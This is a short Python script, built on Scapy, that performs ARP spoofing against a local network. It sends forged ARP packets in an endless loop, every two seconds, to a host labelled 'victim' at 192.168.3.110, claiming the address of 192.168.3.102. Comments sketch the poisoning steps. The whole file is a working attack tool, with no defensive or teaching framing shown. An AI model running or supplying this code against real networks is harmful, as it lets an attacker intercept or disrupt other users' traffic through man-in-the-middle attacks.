from scapy.all import *

import time
#Step-1 :  psrc=192.168.3.102  >>>> FF:FF:FF:FF:FF:FF
#step-2 :  psrc= 192.168.3.1  >>> 192.168.3.102
# (192.168.3.1) at c4:ad:34:a2:c4:be [ether] on eth0
from scapy.layers.l2 import ARP

victim = "192.168.3.110"
target = "192.168.3.102"
mac = "00:0c:29:bc:92:55"

arp = ARP(op=1,psrc=target,pdst=victim,hwdst=mac)

while True:
    send(arp)
    time.sleep(2)
